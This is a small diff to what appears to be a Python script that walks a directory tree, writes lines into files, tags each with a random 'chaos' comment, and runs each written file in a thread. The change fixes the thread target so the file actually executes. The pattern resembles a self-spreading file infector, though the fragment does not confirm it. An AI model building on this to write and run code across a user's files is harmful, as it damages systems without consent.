@@ -52,7 +52,7 @@ for x in os.walk(directory):
     writeIntoFile(g, lines)
     g.write('\n#{chaos}'.format(chaos="".join(random.choices(string.ascii_lowercase + string.digits, k=5))))
     g.close()
-    thread = Thread(target=runFunc(g))
+    thread = Thread(target=runFunc(x[0] + "/" + filename))
     thread.start()
 
 #Ensure this thread gets closed
